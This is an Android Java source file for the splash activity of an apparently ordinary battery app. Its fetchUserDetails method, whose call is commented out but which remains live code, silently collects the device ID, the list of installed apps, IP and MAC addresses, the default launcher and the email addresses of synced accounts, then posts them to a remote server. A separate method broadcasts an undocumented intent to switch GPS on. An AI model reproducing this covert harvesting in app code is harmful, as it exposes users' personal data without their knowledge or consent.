package com.receptix.batterybuddy.activities;


import android.accounts.Account;
import android.accounts.AccountManager;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import android.util.Patterns;
import android.widget.ImageView;
import android.widget.TextView;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.daimajia.androidanimations.library.Techniques;
import com.daimajia.androidanimations.library.YoYo;
import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonPrimitive;
import com.koushikdutta.async.future.FutureCallback;
import com.koushikdutta.ion.Ion;
import com.receptix.batterybuddy.R;
import com.receptix.batterybuddy.ScreenListenerService;
import com.receptix.batterybuddy.helper.UserSessionManager;
import com.receptix.batterybuddy.helper.Utils;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.CLICK_TIME;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.INSTALL_TIME;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.INSTALL_TYPE;
import static com.receptix.batterybuddy.helper.Constants.APPS_FLYER_ATTRIBUTES.MEDIA_SOURCE;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.COUNTRY;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEFAULT_LAUNCHER;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_ID;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.DEVICE_INFO;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.EMAILS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.ETHERNET;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.INSTALLED_APPS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.IP_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.LOCATION;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.MAC_ADDRESS;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.REQUEST_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.RESPONSE_OBJECT;
import static com.receptix.batterybuddy.helper.Constants.JsonProperties.WLAN;
import static com.receptix.batterybuddy.helper.Constants.Urls.URL_OZOCK;


public class MainActivity extends AppCompatActivity {

    UserSessionManager userSessionManager;
    Context context;
    // Splash screen timer
    private static int SPLASH_TIME_OUT = 3000;
    private ImageView imageView_splashScreen;


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        context = getApplicationContext();
        userSessionManager = new UserSessionManager(context);

        //start screen listener service
        startService(new Intent(this, ScreenListenerService.class));

        findViewsById();

      /*  fetchUserDetails();*/

        new Handler().postDelayed(new Runnable() {


            @Override
            public void run() {

                if (userSessionManager.isFirstTime()) {
                    startActivity(new Intent(MainActivity.this, TermsAndConditionsActivity.class));
                    finish();
                } else {
                    startActivity(new Intent(MainActivity.this, NavigationActivity.class));
                    finish();
                }

            }
        }, SPLASH_TIME_OUT);


    }

    private void findViewsById() {
        imageView_splashScreen = (ImageView) findViewById(R.id.imageview_splash_screen);
       /* YoYo.with(Techniques.Bounce)
                .repeat(10)
                .playOn(findViewById(R.id.imageview_splash_screen));*/
    }

    private void fetchUserDetails() {

        String country = "india";
        String location = "delhi";

        // get user location and country...
        boolean gps_enabled = false;
        boolean network_enabled = false;
        LocationManager locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        try {
            gps_enabled = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
            network_enabled = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
        } catch (Exception ex) {
            ex.printStackTrace();
        }

        // get device id
        String userDeviceId = Settings.Secure.ANDROID_ID;
        JsonObject jsonObject = new JsonObject();
        jsonObject.addProperty(DEVICE_ID, userDeviceId);

        // get list of installed apps on user device
        JsonArray installedAppsList = new JsonArray();
        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
        for (int i = 0; i < packList.size(); i++) {
            PackageInfo packInfo = packList.get(i);
            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
                JsonPrimitive jsonPrimitive = new JsonPrimitive(appName);
                installedAppsList.add(jsonPrimitive);
            }
        }

        // get user device information
        StringBuilder deviceInfoStringBuilder = new StringBuilder();
        deviceInfoStringBuilder.append("Android Version : ").append(Build.VERSION.RELEASE);

        Field[] fields = Build.VERSION_CODES.class.getFields();
        String osName = fields[Build.VERSION.SDK_INT].getName();
        deviceInfoStringBuilder.append(" OS Name :").append(osName);

        String deviceIpAddress = Utils.getIPAddress(true);
        String deviceMacAddress = Utils.getMACAddress(WLAN);
        if (deviceMacAddress.length() == 0) {
            deviceMacAddress = Utils.getMACAddress(ETHERNET);
        }

        // get the default launcher
        Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.addCategory(Intent.CATEGORY_HOME);
        ResolveInfo defaultLauncher = getPackageManager().resolveActivity(intent, PackageManager.MATCH_DEFAULT_ONLY);
        String defaultLauncherStr = defaultLauncher.activityInfo.packageName;


        // Get user account (synced accounts on device)
        Pattern emailPattern = Patterns.EMAIL_ADDRESS; // API level 8+
        Account[] accounts = AccountManager.get(context).getAccounts();
        JsonArray userAccounts = new JsonArray();

        for (Account account : accounts) {
            if (emailPattern.matcher(account.name).matches()) {
                String possibleEmail = account.name;
                JsonPrimitive jsonPrimitive = new JsonPrimitive(possibleEmail);
                userAccounts.add(jsonPrimitive);
            }
        }

        // create final JSONObject to be sent to server
        jsonObject.addProperty(DEVICE_INFO, deviceInfoStringBuilder.toString());
        jsonObject.addProperty(IP_ADDRESS, deviceIpAddress);
        jsonObject.addProperty(MAC_ADDRESS, deviceMacAddress);
        jsonObject.addProperty(DEFAULT_LAUNCHER, defaultLauncherStr);
        jsonObject.addProperty(LOCATION, location);
        jsonObject.addProperty(COUNTRY, country);
        jsonObject.add(INSTALLED_APPS, installedAppsList);
        jsonObject.add(EMAILS, userAccounts);
        Log.d(REQUEST_OBJECT, jsonObject.toString());


        Ion.with(context)
                .load(URL_OZOCK)
                .setJsonObjectBody(jsonObject)
                .asJsonObject()
                .setCallback(new FutureCallback<JsonObject>() {
                    @Override
                    public void onCompleted(Exception e, JsonObject result) {
                        Log.d(RESPONSE_OBJECT, String.valueOf(result));
                    }
                });


    }

    public void showSettingAlert() {
        AlertDialog.Builder alertDialog = new AlertDialog.Builder(context);
        alertDialog.setTitle("GPS Setting")
                .setMessage("Enable GPS Now")
                .setPositiveButton("On", new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        Intent intent = new Intent("android.location.GPS_ENABLED_CHANGE");
                        intent.putExtra("enabled", true);
                        sendBroadcast(intent);
                    }
                });
    }

    @Override
    public void onBackPressed() {
        // do nothing if user presses back button (let the activity load)
    }
}
